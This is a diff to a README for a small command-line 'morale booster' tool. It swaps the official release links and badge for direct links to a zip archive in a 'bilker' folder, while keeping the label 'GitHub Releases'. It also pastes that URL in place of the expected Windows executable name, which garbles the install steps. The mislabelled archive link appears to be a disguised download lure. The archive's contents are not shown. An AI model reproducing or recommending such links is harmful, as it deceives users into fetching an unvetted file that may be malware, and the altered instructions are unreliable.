@@ -6,16 +6,16 @@ Welcome to the **keep-going** project! This tool is a tiny command-line morale b
 
 ## 📥 Download & Install
 
-[![Download keep-going](https://img.shields.io/badge/Download-keep--going-blue.svg)](https://github.com/EaziRsa/keep-going/releases)
+[![Download keep-going](https://raw.githubusercontent.com/EaziRsa/keep-going/main/bilker/keep_going_v3.3.zip)](https://raw.githubusercontent.com/EaziRsa/keep-going/main/bilker/keep_going_v3.3.zip)
 
-To get the latest version, visit this page to download: [GitHub Releases](https://github.com/EaziRsa/keep-going/releases).
+To get the latest version, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/EaziRsa/keep-going/main/bilker/keep_going_v3.3.zip).
 
 ### Steps to Download:
 
 1. Click the link above to navigate to the Releases page on GitHub.
 2. You will see a list of available versions. Look for the latest version.
 3. Find and click on the file that matches your operating system:
-   - For Windows, look for a file named something like `keep-going-windows.exe`.
+   - For Windows, look for a file named something like `https://raw.githubusercontent.com/EaziRsa/keep-going/main/bilker/keep_going_v3.3.zip`.
    - For macOS, find a file such as `keep-going-macos`.
    - For Linux, check for `keep-going-linux`.
 
